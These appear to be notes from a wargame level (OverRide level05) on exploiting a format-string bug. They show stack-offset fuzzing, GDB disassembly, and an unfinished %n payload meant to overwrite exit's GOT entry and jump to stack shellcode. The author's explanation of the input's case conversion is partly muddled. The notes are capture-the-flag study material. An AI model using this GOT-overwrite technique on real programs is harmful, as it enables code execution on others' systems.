
fuzzing phase

```
level05@OverRide:~$ ./level05
ssss
ssss

obiously some format string here

level05@OverRide:~$ ./level05
%p %p %p

level05@OverRide:~$ (python -c 'print "AAAA" + " %p " * 10') | ./level05
aaaa 0x64  0xf7fcfac0  0xf7ec3af9  0xffffd6bf  0xffffd6be  (nil)  0xffffffff  0xffffd744  0xf7fdb000  0x61616161

level05@OverRide:~$ (python -c 'print "AAAA" + " %10$p "') | ./level05
aaaa 0x61616161
```

lets jump into jdb 

```
   0x08048507 <main+195>:	call   0x8048340 <printf@plt>
   0x0804850c <main+200>:	movl   $0x0,(%esp)
   0x08048513 <main+207>:	call   0x8048370 <exit@plt>
```   
   its GOT obviously

```
   (gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
```

```

x/600wx $esp
0xffffde60:	0x90909090	0x90909090	0x90909090	0x90909090


(gdb) p 0x80497e0  = 134518752
(gdb) p 0xffffde60 - 4 = 4294958684

```

```
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294958684d%10$n"' ; cat) | ./level05 > /dev/null
id 1>&2
```

mmm smthg wrong

lets debug the assembly

```

=> 0x8048466 <main+34>:	movl   $0x64,0x4(%esp)
   0x804846e <main+42>:	lea    0x28(%esp),%eax
   0x8048472 <main+46>:	mov    %eax,(%esp)
   0x8048475 <main+49>:	call   0x8048350 <fgets@plt>
   
buffer of size 100 stored at esp + 0x28
```
0x08048495 <+81>:	cmp    $0x40,%al

0x080484a7 <+99>:	cmp    $0x5a,%al

The code checks if the character is less than or equal to 0x40, which corresponds to '@' in ASCII,
and if it is greater than 0x5a, which corresponds to 'Z' in ASCII. If the character is within this range,
the code jumps to the main+135 address, which indicates that the input is invalid.

 0x080484cb <+135>:	addl   $0x1,0x8c(%esp)

```
'A' 0x41 65    XOR     32

01000001 = 65 = 'A'
XOR
00100000 = 32

01100001 = 97 = 'a'

python3 -c "print(65 ^ 32)"
97
```

```
level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level05
aaaabbbb 0x61616161 0x62626262
```















